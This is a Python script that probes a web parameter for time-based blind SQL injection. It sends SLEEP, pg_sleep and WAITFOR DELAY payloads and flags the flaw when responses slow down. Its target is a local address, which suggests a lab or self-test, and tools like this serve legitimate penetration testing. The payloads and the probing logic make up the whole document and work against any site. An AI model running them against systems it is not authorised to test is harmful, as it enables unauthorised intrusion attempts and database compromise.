import requests
import time

def test_time_based_sqli(url, param):
    print("[*] Testing Time-Based Blind SQLi on: " + url)
    
    normal_url = url + "?" + param + "=1"
    start = time.time()
    try:
        requests.get(normal_url, timeout=10)
    except:
        pass
    baseline_time = time.time() - start
    print("[Baseline] Response time: {:.2f} seconds\n".format(baseline_time))
    
    payloads = [
        ("' AND SLEEP(3) -- ", 3),
        ("' AND pg_sleep(3) -- ", 3),
        ("'; WAITFOR DELAY '0:0:3' -- ", 3),
        ("' AND SLEEP(3) #", 3)
    ]
    
    for payload, expected_delay in payloads:
        test_url = url + "?" + param + "=" + payload
        print("[*] Testing payload: " + payload.strip())
        
        start = time.time()
        try:
            requests.get(test_url, timeout=15)
        except Exception as e:
            print("    [-] Error: " + str(e))
            continue
        response_time = time.time() - start
        
        print("    [>] Response time: {:.2f}s".format(response_time))
        
        if response_time >= (baseline_time + expected_delay - 0.5):
            print("\n[+] TIME-BASED BLIND SQLi FOUND!")
            print("    Payload: " + payload.strip())
            print("    Delay: {:.2f}s".format(response_time - baseline_time))
            return True
    
    print("\n[-] No time-based SQLi detected.")
    return False

if __name__ == "__main__":
    target = "http://127.0.0.1:8000/product"
    test_time_based_sqli(target, "id")
